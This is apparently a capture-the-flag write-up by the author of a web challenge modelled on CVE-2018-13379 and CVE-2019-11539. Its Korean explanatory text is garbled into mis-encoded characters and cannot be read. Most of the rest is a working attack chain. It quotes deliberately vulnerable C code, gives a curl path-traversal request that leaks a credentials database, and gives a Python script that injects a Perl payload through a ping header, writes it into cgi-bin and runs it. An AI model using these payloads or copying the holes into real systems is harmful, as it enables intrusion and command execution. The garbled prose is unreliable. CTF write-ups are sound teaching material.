n1net4il â€” ì˜¤ëŠ˜ ì˜¤í›„ 10:00
[web 1 - Vanitas Writeup]

ì œ ëŠ¥ë ¥ ë¶€ì¡± + ì‹œê°„ ë¶€ì¡±ìœ¼ë¡œ ì •ë§ ë”± ë¬¸ì œì— í•„ìš”í•œ ê¸°ëŠ¥ë§Œ êµ¬í˜„ë˜ì—ˆì§€ë§Œ ë‹¤ìŒ ë‘ ì·¨ì•½ì ì„ ì˜¤ë§ˆì£¼í•œ ê²ƒì´ì—ˆìŠµë‹ˆë‹¤.
CVE-2018-13379: https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
CVE-2019-11539: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html

í’€ì´ì— ì•ì„œ ë¯¸ìˆ™í•œ êµ¬í˜„ ìƒíƒœì— ì£„ì†¡í•˜ë‹¤ëŠ” ë§ì”€ì„ ë“œë¦½ë‹ˆë‹¤.
í’€ì´ìë¶„ë“¤ê»˜ëŠ” ë°”ì´ë„ˆë¦¬ë§Œ ì œê³µë˜ì–´ìˆì§€ë§Œ í•´ë‹¹ í’€ì´ì—ì„œëŠ” ì½ì–´ì£¼ì‹œëŠ” ë¶„ë“¤ì˜ í¸ì˜ë¥¼ ìœ„í—¤ ì†ŒìŠ¤ì½”ë“œë¥¼ ì¸ìš©í•©ë‹ˆë‹¤.

localeì— ë§ëŠ” html íŒŒì¼ì„ ê°€ì ¸ì˜¬ ë•Œ snprintfë¥¼ ì‚¬ìš©í•˜ì—¬ ê¸€ì ìˆ˜ë¥¼ ì˜ ë§ì¶”ë©´ ë’¤ì˜ .htmlì„ truncateì‹œí‚¤ëŠ” ê²ƒì´ ê°€ëŠ¥. ì´ë¥¼ ì´ìš©í•´ .dbë¥¼ leakí•˜ì—¬ ì•„ì´ë”” ë° ë¹„ë°€ë²ˆí˜¸ë¥¼ íšë“. (Ref. CVE-2018-13379)
char *locale = strdup(request->path + 1);
locale[strlen(request->path) - 5] = '\0';
snprintf(filepath, 0x100, "html/auth/%s.html", locale);

$ curl http://52.78.31.14/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////../../.db/auth --path-as-is --output .db
$ sqlite3 .db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> select * from users;
vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e


diagnosis ìª½ì—ì„œ command injectionì´ ìˆì§€ë§Œ filterë¡œ ì¸í•´ ì§ì ‘ì ì¸ RCEê°€ ì–´ë ¤ìš´ ìƒí™©
char command[0x100];

host = get_http_request_header(request, "X-Target");
check_command(fd, host);
snprintf(command, 0x100, "ping %s", host);


ê°„ë‹¨í•œ python/perl cgi ê¸°ëŠ¥ì´ ì¡´ì¬í•¨
if (endswith(cgi_path, ".py")) {
    snprintf(command, 0x100, "/usr/bin/python3 %s", cgi_path);
} else if (endswith(cgi_path, ".pl")) {
    snprintf(command, 0x100, "/usr/bin/perl %s", cgi_path);
} else {
    send_http_response_404(fd);
    exit(EXIT_SUCCESS);
}


pythonì—ì„œëŠ” ë¶ˆê°€ëŠ¥í•˜ì§€ë§Œ perlì—ì„œëŠ” ":" ë¬¸ìê°€ goto labelë¡œ ì¸ì‹ëœë‹¤ëŠ” ì ì„ ì´ìš©í•˜ë©´ ì´ëŸ¬í•œ ê²ƒì´ ê°€ëŠ¥í•¨. (Ref. CVE-2019-11539)

ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1
ping: print 123#: Name or service not known

ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1 | perl
123


command injection filterì— ">" ë¬¸ìëŠ” ë§‰í˜€ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ì´ë¥¼ ì´ìš©í•´ cgi-binì— í„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„± í›„ ì‹¤í–‰
import requests

TARGET = 'http://52.78.31.14'

response = requests.get(TARGET + '/en/diagnosis', headers = {
    'Cookie' : 'auth=vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e',
    'X-Target' : '\\$x=\\"cat\\\\t/flag_645b0ab1d0f09363d9cf86ea7dd85a34\\",system\\$x# 2> cgi-bin/asdfasdjklfjklas.pl',
})
print(response.status_code)

response = requests.get(TARGET + '/cgi-bin/asdfasdjklfjklas.pl')
print(response.text)


Orange
Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN
https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
This is ğŸŠ speaking
ì´ë¯¸ì§€
Orange
Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Cha...
https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
This is ğŸŠ speaking